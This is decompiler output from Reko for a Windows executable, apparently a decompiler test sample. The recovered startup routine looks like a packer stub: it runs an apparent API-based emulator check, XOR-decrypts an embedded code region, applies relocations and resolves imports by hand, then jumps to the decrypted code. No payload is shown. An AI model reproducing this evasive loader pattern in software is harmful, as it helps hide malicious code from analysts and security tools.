// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: Register Eq_2 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	Eq_3 eax_28 = AddAce(null, 0x00, 0x00, null, 0x00);
	Eq_17 esi_15 = 0x00;
	word32 edi_272 = eax_28 + 0x15;
	if (AreAnyAccessesGranted(~0x00, ~0x00) == 0x00)
		edi_272 = eax_28 - 0x0D;
	struct Eq_31 * ecx_49 = null;
	do
	{
		if (esi_15 == edi_272)
			esi_15.u0 = 0x00;
		ecx_49[0x00401190] = (struct Eq_31) (ecx_49[0x00401190] ^ *((word32) esi_15 + 0x00404000));
		ecx_49 = ecx_49 + 0x01;
		esi_15 = (word32) esi_15 + 0x01;
	} while (ecx_49 < (struct Eq_31 *) 0x1440);
	uint32 ebx_105 = 0x00;
	struct Eq_55 * ecx_109 = &globals->t402490;
	uint32 dwLoc08_107 = 0x00;
	do
	{
		Eq_61 eax_90 = ecx_109->t0004;
		word16 * edx_244 = (char *) &ecx_109->t0004 + 0x04;
		if (eax_90 - 0x08 >> 0x01 > 0x00)
		{
			uint32 esi_243 = eax_90 - 0x08 >> 0x01;
			do
			{
				ui32 eax_246 = (word32) *edx_244;
				if ((eax_246 & 0xF000) == 0x3000)
				{
					struct Eq_181 * eax_262 = (eax_246 & 0x0FFF) + ecx_109->dw0000;
					eax_262->dw400F10 = eax_262->dw400F10 + 4030730000;
				}
				edx_244 = edx_244 + 0x01;
				esi_243 = esi_243 - 0x01;
			} while (esi_243 != 0x00);
			ebx_105 = dwLoc08_107;
		}
		ebx_105 = (word32) ecx_109->t0004 + ebx_105;
		dwLoc08_107 = ebx_105;
		ecx_109 = ecx_109 + Mem67[ecx_109 + 0x04:word32];
	} while (ebx_105 < 228);
	struct Eq_94 * esi_112 = &globals->t401C84;
	struct Eq_94 * dwLoc08_113 = &globals->t401C84;
	esi_147 = esi_112;
	if (globals->dw401C94 != 0x00)
	{
		do
		{
			struct Eq_94 * esi_147;
			Eq_133 eax_154 = LoadLibraryA(esi_147->dw000C + 0x00400F10);
			if (eax_154 != null)
			{
				word32 ebx_180 = esi_147->dw0000;
				if (ebx_180 == 0x00)
					ebx_180 = esi_147->dw0010;
				word32 * ebx_185 = ebx_180 + 0x00400F10;
				word32 * esi_188 = esi_147->dw0010 + 0x00400F10;
				if (*ebx_185 != 0x00)
				{
					do
					{
						Eq_136 dwLoc1C_223;
						int32 eax_217 = *ebx_185;
						word16 ax_219 = (word16) eax_217;
						if (eax_217 < 0x00)
							dwLoc1C_223 = (word32) ax_219;
						else
							dwLoc1C_223 = eax_217 + 0x00400F12;
						*esi_188 = (word32) GetProcAddress(eax_154, dwLoc1C_223);
						ebx_185 = ebx_185 + 0x01;
						esi_188 = esi_188 + 0x01;
					} while (*ebx_185 != 0x00);
				}
				esi_147 = dwLoc08_113;
			}
			esi_147 = esi_147 + 0x01;
			dwLoc08_113 = esi_147;
		} while (esi_147->dw0010 != 0x00);
	}
	ptr32 esp_124;
	byte SCZO_125;
	word32 ebx_126;
	word32 ebp_127;
	word32 esi_128;
	word32 edi_129;
	byte SZO_130;
	byte C_131;
	word32 edx_132;
	word32 eax_133;
	byte Z_134;
	word32 ecx_135;
	byte al_136;
	byte S_137;
	word16 ax_138;
	globals->t401960();
	*(esp_124 - 0x04) = 0x00;
	ExitProcess(*(esp_124 - 0x04));
}

